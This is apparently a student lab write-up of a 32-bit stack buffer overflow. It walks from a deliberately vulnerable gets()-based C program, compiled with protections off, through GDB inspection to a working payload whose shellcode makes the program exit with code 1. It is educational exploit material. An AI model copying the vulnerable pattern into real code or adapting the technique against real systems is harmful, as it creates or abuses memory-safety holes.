---
title: Buffer overflow to exit
date: 2024-02-24
author:
  - "0x42697262"
  - Orochi
  - Jinx
---

# Buffer overflow to exit

## TL;DR

Open GDB

```sh
gdb vuln
```

Run the program once

```
(gdb) r
```

Then exit (CTRL+C) and dissassemble the symbol `vuln`

```
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x5655617d <+0>:     push    %ebp
   0x5655617e <+1>:     mov     %esp,%ebp
   0x56556180 <+3>:     sub     $0x8,%esp
   0x56556183 <+6>:     lea     -0x8(%ebp),%eax
   0x56556186 <+9>:     push    %eax
   0x56556187 <+10>:    call    0xf7c741b0 <_IO_gets>
   0x5655618c <+15>:    add     $0x4,%esp
   0x5655618f <+18>:    nop
   0x56556190 <+19>:    leave
   0x56556191 <+20>:    ret
End of assembler dump.
```

Add a breakpoint on the first instruction and run it once again

```
(gdb) b *0x5655617d
Breakpoint 1 at 0x5655617d: file vuln.c, line 3.
(gdb) r
Breakpoint 1, vuln () at vuln.c:3
3	void vuln() {
```

Print the address of the variable `buffer`

```
(gdb) p &buffer
$1 = (char (*)[8]) 0xffffcd18
```

Craft the exploit with the shellcode payload and memory address of the `buffer`

```
\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90\x18\xcd\xff\xff
```

Execute the exploit inside GDB

```
(gdb) r <<< $(echo -ne "\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90\x18\xcd\xff\xff")
```

The program should terminate with the exit status code `1`

```
[Inferior 1 (process 1027954) exited with code 01]
```

---

## Introduction

A vulnerable C source code is provided that accepts an unbounded number of non-null byte characters from standard input.
The goal is to construct a **shellcode** to cause the program to terminate with a desired **exit code** of `1` using a stack smashing attack.

Note that crashes due to malformed "shellcode" will not result in an exit code of `1` and therefore will not count.

---

## Pre-requisites

### Vulnerable C Source Code

```c
// vuln.c
#include <stdio.h>

void vuln() {
    char buffer[8];
    gets(buffer);
}

int main() {
    vuln();
    while (1) {
    }
}
```

### Tools

- GNU Compiler Collection (GCC)
- GNU Debugger (GDB)
- Netwide Assembler (NASM)
- objdump

### Compilation with disabled security protections

```sh
$ gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -fno-pie -ggdb -z execstack vuln.c -o vuln
```

- `-fno-stack-protector` disables stack smashing protection.
- `-m32` generate 32-bit architecture code.
- `-mpreferred-stack-boundary=2` stack boundary should be aligned in 4 bytes.
- `-ggdb` generate debug information compatible with the GDB debugger.
- `-fno-pie` disables position-independent executable (PIE) generation which randomizes the base address of the executable.
- `-z execstack` sets the stack as executable.

This compilation step is necessary otherwise it would almost be a bit harder to execute this type of buffer overflow.

```
*** stack smashing detected ***: terminated
[1]    1024635 IOT instruction (core dumped)
```

### Shellcode

Generally, we should acquire the shellcode somewhere like Shell-Storm.
But for the sake of learning, we can generate our own shellcode.
Knowledge in assembly language would be needed.
We have this shellcode that terminates the program with exit status code `1`

```asm
section .text
global main

main:
    xor eax, eax   ; Clear EAX register
    inc eax        ; Increment EAX to 1
    mov ebx, eax   ; Move the value of EAX into EBX (not %eab)
    int 0x80       ; Invoke system call
```

To compile,

```sh
$ nasm -f elf32 shellcode.asm -o shellcode.o
```

This should output an ELF LSB relocatable code `ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), not stripped`.
To acquire the shellcode to be used for the explotation payload, we can use `objdump`

```sh
$ objdump -M intel -d solutions/shellcode.o
```

Its output would be

```
solutions/shellcode.o:     file format elf32-i386


Disassembly of section .text:

00000000 <main>:
   0:   31 c0                   xor    eax,eax
   2:   40                      inc    eax
   3:   89 c3                   mov    ebx,eax
   5:   cd 80                   int    0x80
```

Putting all the bytes together, our shellcode is

```
\x31\xc0\x40\x89\xc3\xcd\x80
```

Which is just 7 bytes long.

## Methodology

The exit shellcode is 7 bytes long small enough to fit inside the buffer's size.
The memory address location of the `buffer` can be used as the return address where the shellcode will be stored.
The next stack after buffer is the base pointer (EBP), after the base pointer is the return address of the `vuln` function that will be modified to point to the memory address of the `buffer`.

With this, an exploit can be crafted to terminate the program with the desired exit status code of `1`.

First, run GDB with the program as the parameter

```sh
$ gdb vuln
```

And should be greeted with

```
Reading symbols from vuln...
(gdb)
```

But set the assembly language syntax first to Intel

```
(gdb) set disassembly-flavor intel
```

---

### Enumeration

Since the binary is not stripped, the function symbols can be printed.
Disassemble the `main` and `vuln` symbols in assembly language.

```
(gdb) disassemble main
Dump of assembler code for function main:
   0x00001192 <+0>:     push    ebp
   0x00001193 <+1>:     mov     ebp,esp
   0x00001195 <+3>:     call    0x117d <vuln>
   0x0000119a <+8>:     jmp     0x119a <main+8>
End of assembler dump.

(gdb) disassemble vuln
Dump of assembler code for function vuln:
   0x0000117d <+0>:     push    ebp
   0x0000117e <+1>:     mov     ebp,esp
   0x00001180 <+3>:     sub     esp,0x8
   0x00001183 <+6>:     lea     eax,[ebp-0x8]
   0x00001186 <+9>:     push   eax
   0x00001187 <+10>:    call    0x1188 <vuln+11>
   0x0000118c <+15>:    add     esp,0x4
   0x0000118f <+18>:    nop
   0x00001190 <+19>:    leave
   0x00001191 <+20>:    ret
End of assembler dump.
```

The address of `buffer` must be known.
However, breakpoints cannot be added yet since the memory of the program is not yet allocated.

```
(gdb) run
```

And exit (CTRL+C).

Disassemble the symbols again for `vuln`

```
(gdb) disassemble vuln
Dump of assembler code for function vuln:
   0x5655617d <+0>:     push    ebp
   0x5655617e <+1>:     mov     ebp,esp
   0x56556180 <+3>:     sub     esp,0x8
   0x56556183 <+6>:     lea     eax,[ebp-0x8]
   0x56556186 <+9>:     push    eax
   0x56556187 <+10>:    call    0xf7c741b0 <_IO_gets>
   0x5655618c <+15>:    add     esp,0x4
   0x5655618f <+18>:    no
   0x56556190 <+19>:    leave
   0x56556191 <+20>:    ret
End of assembler dump.
```

The proper memory addresses can now be seen.
Add a breakpoint to the first instruction `push ebp`

```
(gdb) break *0x5655617d
Breakpoint 1 at 0x5655617d: file vuln.c, line 3.
```

A `*` is needed since the address is a pointer.

Define hooks for the breakpoint

```
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/1i $eip
>x/16wx $esp
>end
```

These commands will automatically execute once a breakpoint is hit.
What it does is print the instruction pointer of the current function and print out the 16 bytes of the stack pointer.

Rerun the program

```
(gdb) run
=> 0x5655617d <vuln>:	push   ebp
0xffffcd24:	0x5655619a	0x00000000	0xf7c20af9	0x00000001
0xffffcd34:	0xffffcde4	0xffffcdec	0xffffcd50	0xf7e1fe2c
0xffffcd44:	0x56556192	0x00000001	0xffffcde4	0xf7e1fe2c
0xffffcd54:	0xffffcdec	0xf7ffcb60	0x00000000	0xa8a49fe9

Breakpoint 1, vuln () at vuln.c:3
3	void vuln() {
```

There are still no inputs provided here but the memory address of the `buffer` can already be acquired.

```
(gdb) print &buffer
$1 = (char (*)[8]) 0xffffcd18
```

The memory address of `buffer` is stored at `0xffffcd18` and this is where the standard input are stored.
To check, add another breakpoint on the `ret` instruction and continue the execution

```
(gdb) break *0x56556191
Breakpoint 2 at 0x56556191: file vuln.c, line 6.
(gdb) continue
Continuing.
AAAABBBBCCCCDDDDAAAABBBBCCCCDDDD
=> 0x56556191 <vuln+20>:	ret
0xffffcd24:	0x44444444	0x41414141	0x42424242	0x43434343
0xffffcd34:	0x44444444	0xffffcd00	0xffffcd50	0xf7e1fe2c
0xffffcd44:	0x56556192	0x00000001	0xffffcde4	0xf7e1fe2c
0xffffcd54:	0xffffcdec	0xf7ffcb60	0x00000000	0xa8a49fe9

Breakpoint 2, 0x56556191 in vuln () at vuln.c:6
6	}
```

The input for this was `AAAABBBBCCCCDDDDAAAABBBBCCCCDDDD` as can be seen, the bytes got replaced up until `0xffffcd37`.
The contents of the `buffer` can be checked by

```
(gdb) x/16wx &buffer
0xffffcd18:	0x41414141	0x42424242	0x43434343	0x44444444
0xffffcd28:	0x41414141	0x42424242	0x43434343	0x44444444
0xffffcd38:	0xffffcd00	0xffffcd50	0xf7e1fe2c	0x56556192
0xffffcd48:	0x00000001	0xffffcde4	0xf7e1fe2c	0xffffcdec
```

The first 8 bytes (`0x41414141	0x42424242`) are the buffer's contents.
The next 4 bytes (`0x43434343`) is the base pointer.
The next 4 bytes (`0x44444444`) is the return address which will be modified to point to the address of the `buffer` (at `0xffffcd18`).
This is where the shellcode will be stored.

### Exploitation

We can use any means necessary to send raw bytes to the input, but to make things simpler, we will be using `echo`.
Notice that the structure of the memory address is as follows:

```
[ 0x-------- 0x-------- ] [ 0x-------- ] [ 0x-------- ] ...
          buffer                ebp           esp
```

The payload `\x31\xc0\x40\x89\xc3\xcd\x80` can be stored on the `buffer`'s memory space

```
[ 0x8940c031 0x--80cdc3 ] [ 0x-------- ] [ 0x-------- ] ...
          buffer                ebp           esp
```

Notice that the raw bytes are stored in little-endian system.

Since the size of the payload is only 7 bytes long, NOP (no operation) instruction must be appended in order for the return address (ESP) to be modified.
The total size of the buffer and the EBP is 12 bytes.
Thus, there are 5 bytes worth of NOPs to be padded.

```
[ 0x8940c031 0x9080cdc3 ] [ 0x90909090 ] [ 0x-------- ] ...
          buffer                ebp           esp
```

The equivalent shellcode is now `\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90`.

Next is to add the memory address of the `buffer`.

```
[ 0x8940c031 0x9080cdc3 ] [ 0x90909090 ] [ 0xffffcd18 ] ...
          buffer                ebp           esp
```

Thus, the final shellcode is `\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90\x18\xcd\xff\xff`.

## Documentation of Proofs

To execute the exploit, run

```
(gdb) run <<< $(echo -ne "\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90\x18\xcd\xff\xff")
```

Which should successfully terminate the program with desired exit status

```
[Inferior 1 (process 1075597) exited with code 01]
```

---

## Conclusion

Stack smashing is an archaic method of binary exploitation that modern computers have protections against it.
Thanks to Address Space Layout Randomization (ASLR) that modern operating systems are equipped with, it would be very difficult to execute this exploit.
Nonetheless, this is a fun exercise and we have learned a lot from it.

---

## Acknowledgement and References

- [LiveOverflow](https://www.youtube.com/@LiveOverflow) for usage of GDB
- [Phrack Volume 7 Issue 49: Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html) for teaching us on smashing the stack
- [Practical Binary Analysis](https://practicalbinaryanalysis.com/) for teaching assembly and basics of ELF
- [Shell-Storm](https://shell-storm.org/shellcode/index.html) for providing shellcodes
